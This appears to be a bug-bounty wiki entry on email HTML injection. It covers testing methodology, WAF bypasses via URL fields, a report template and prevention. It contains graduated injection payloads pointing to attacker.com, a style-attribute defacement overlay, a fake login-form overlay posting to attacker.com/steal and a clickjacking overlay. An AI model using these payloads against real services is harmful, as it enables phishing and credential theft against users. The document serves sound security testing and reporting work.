---
title: "Email HTML Injection"
type: technique
tags: [html-injection, email-injection, content-spoofing, phishing, medium, bug-bounty, api, css-defacement, style-attribute]
date_created: 2026-08-17
date_updated: 2026-08-17
sources: []
related: ["[[xss]]", "[[csrf]]"]
status: active
---

# Email HTML Injection

## Overview

Email HTML Injection (also called Content Injection or Content Spoofing in an email context) occurs when an attacker can insert HTML content or malicious links into transactional emails sent by the application. The email is sent from the company's legitimate domain but contains attacker-controlled content.

Unlike XSS (rendered in the browser), the injected HTML/links are rendered by the victim's **email client**. This makes the attack especially effective for phishing, since the email originates from a trusted address.

## Impact

- **Trusted phishing:** malicious link inside a legitimate company email (trusted sender)
- **Brand abuse:** the company sends an email containing third-party content
- **Reputational damage:** customers harmed by an email that looks official
- **Credential harvesting:** the victim clicks a "legitimate" link and enters data on the attacker's site
- **Typical severity:** Medium (standalone), can rise depending on the demonstrated impact and target

## Where to look

### Input fields that appear in emails

Any field whose value is reflected in transactional emails:

- **Address fields** : `street`, `formattedAddress`, `city` in booking/real-estate APIs
- **Name fields** : `name`, `firstName`, `lastName` in welcome emails
- **Message fields** : `message`, `notes`, `comment` in contact emails
- **Company fields** : `companyName`, `organization` in B2B confirmations
- **Product fields** : `description`, `title` in order confirmations

### Feature types to test

- Booking/reservation forms (hotels, real estate, travel)
- Quote/appraisal request forms
- Account registration (welcome email)
- Checkout/order confirmation
- Contact/support forms
- Valuation requests for property, insurance, financial services

### Discovery pattern

```
Feature that sends an email -> intercept the request with Burp/Caido ->
identify fields -> modify values -> check the received email
```

## Testing methodology

### 1. Identify features that trigger emails

Explore the target for:
- Any form that generates a confirmation email
- POST APIs that accept data appearing in email templates
- Onboarding/registration flows

### 2. Intercept the request

```http
POST /api/booking/confirm HTTP/2
Host: api.target.com
Content-Type: application/json
X-Api-Key: [token]

{
  "name": "Test User",
  "email": "your@email.com",
  "address": {
    "street": "Normal Street, 123",
    "formattedAddress": "Normal Street, 123 - City"
  }
}
```

### 3. Try direct HTML injection (may be blocked by a WAF)

```json
{
  "name": "<b>INJECTED</b>",
  "address": {"street": "<a href='https://attacker.com'>Click here</a>"}
}
```

If it returns 403, try semantic fields:

### 4. Injection via semantic fields (WAF bypass)

```json
{
  "address": {
    "street": "https://attacker.com",
    "formattedAddress": "https://attacker.com"
  }
}
```

Many systems automatically render URLs as clickable links in email clients, even without explicit HTML tags.

### 5. Graduated payloads to test

```
# Level 1: simple URL (often accepted)
https://attacker.com

# Level 2: Markdown (some templates process it)
[Click here](https://attacker.com)

# Level 3: HTML anchor tag
<a href="https://attacker.com">Click here</a>

# Level 4: full HTML
<img src="https://attacker.com/pixel.png">
<b>BOLD TEXT</b>
<h1>INJECTED HEADER</h1>
```

### 6. Check the received email

- Confirm the injected content appears in the email
- Check whether links are clickable
- Screenshot the email with malicious content for the report

## Common bypasses

- **403 on direct HTML:** try semantic fields (URL in an address field)
- **HTML tag filter:** use direct URLs that email clients auto-link
- **HTML escape in the body:** check whether the email subject is filtered separately
- **Front-end validation:** modify the request directly via Burp/Caido (bypass the front-end)

## Tools

- **Burp/Caido** : intercept and modify POST requests that trigger emails
- **Collaborator / OOB** : check whether the server fetches injected URLs (OOB)
- **Mailinator / temp-mail** : disposable email addresses for testing

## Real-world example

- **Target:** property valuation API
- **Endpoint:** `POST /property-valuation/valuation-request`
- **Vector:** `address.street` and `address.formattedAddress` fields in JSON
- **Bypass:** direct HTML returned 403 -> injection via URL in an address field worked
- **Result:** email sent with the attacker's URL

## Reporting tips

1. **Demonstrate the received email** with a screenshot showing the clickable malicious link
2. **Show the sender** : highlight that the email comes from the company's legitimate domain
3. **Write the attack scenario** : how a real user would be deceived
4. **Quantify the impact** : number of exposed users, volume of transactional emails
5. **Propose remediation** : sanitize all fields that appear in email templates

### Report template

```
Title: HTML Injection in [feature] Email Allows Phishing via Legitimate Domain

Summary:
The [field] field in the [endpoint] request is reflected without
sanitization in the [type] email sent to the user. An attacker can inject
malicious links that appear as legitimate company content.

Steps to Reproduce:
1. Access [feature]
2. Intercept the POST to [endpoint]
3. Change the value of [field] to https://attacker.com
4. Confirm submission - the received email contains the malicious link

Impact:
An email sent from the company's legitimate domain contains a link to the
attacker's site. Victims who trust the brand may enter credentials on a
phishing site.

Suggested severity: Medium (CWE-80: Improper Neutralization of Script-Related HTML Tags)
```

## Prevention

- Sanitize all input fields before inserting them into email templates
- Use a character allowlist for address and name fields
- Escape HTML in all values inserted into HTML email templates
- Validate URLs in fields that accept URLs, allowlist domains where possible

## Style-attribute defacement

When a whitelist sanitizer allows `<div>` + a `style` attribute, a full-viewport overlay yields **defacement (P2, CVSS 7.1 High, A:H)**:

```html
"><div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 1);z-index: 5000;"></div>
```

Anatomy:
- `position: fixed` + `top:0 right:0 bottom:0 left:0` -> covers the entire viewport
- `background: rgba(0,0,0,1)` -> opaque
- `z-index: 5000` -> overlaps everything
- `pointer-events: auto` (default) -> captures clicks

**Lesson**: sanitizers that trust only a **tag allowlist** but ignore the `style` attribute allow full defacement without JS.

### Additional style variants

```html
<!-- Phishing fake-form overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h1>Session expired - please log in</h1>
  <form action="https://attacker.com/steal">...</form>
</div>

<!-- Clickjacking - transparent overlay -->
<a href="https://attacker.com" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;z-index:9999">click</a>
```

## References

- CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
- OWASP Content Spoofing: https://owasp.org/www-community/attacks/Content_Spoofing
